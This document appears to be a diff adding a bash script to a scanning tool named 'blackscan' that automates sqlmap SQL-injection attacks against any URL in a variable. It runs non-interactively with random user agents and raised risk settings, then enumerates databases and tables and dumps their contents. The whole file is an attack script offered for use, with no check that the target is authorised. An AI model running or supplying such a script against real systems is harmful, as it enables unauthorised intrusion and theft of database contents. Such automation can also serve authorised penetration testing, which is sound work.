@@ -1,0 +1,63 @@
+#!/bin/bash
+
+# Set strict error handling
+set -euo pipefail
+
+# Define constants
+OUTPUT_DIR="/opt/blackscan/data/sqlmap"
+SCAN_OUTPUT="${OUTPUT_DIR}/results"
+
+# Ensure target is provided
+if [ -z "${blackscan:-}" ]; then
+    echo "Error: No target specified in \$blackscan variable"
+    exit 1
+fi
+
+# Create output directory
+mkdir -p "$OUTPUT_DIR"
+
+echo "Starting SQLMap scan against: $blackscan"
+
+# Run SQLMap with common options
+# --batch: Non-interactive mode
+# --random-agent: Use a random User-Agent
+# --level 3: Detection level (higher = more tests)
+# --risk 2: Risk level (higher = more aggressive tests)
+# -o: Turn on all optimization switches
+sqlmap -u "$blackscan" \
+    --batch \
+    --random-agent \
+    --level 3 \
+    --risk 2 \
+    -o \
+    --output-dir="$OUTPUT_DIR" \
+    --dbs
+
+# Test for specific vulnerabilities if initial scan found database
+if [ $? -eq 0 ]; then
+    echo "Initial scan successful. Running additional tests..."
+    
+    # Try to enumerate tables in found databases
+    sqlmap -u "$blackscan" \
+        --batch \
+        --random-agent \
+        --level 3 \
+        --risk 2 \
+        -o \
+        --output-dir="$OUTPUT_DIR" \
+        --tables
+    
+    # Try to dump data from tables
+    sqlmap -u "$blackscan" \
+        --batch \
+        --random-agent \
+        --level 3 \
+        --risk 2 \
+        -o \
+        --output-dir="$OUTPUT_DIR" \
+        --dump
+else
+    echo "Initial scan did not find injection points. Try manual testing with different parameters."
+fi
+
+echo "SQLMap scan completed. Results are stored in: $OUTPUT_DIR"
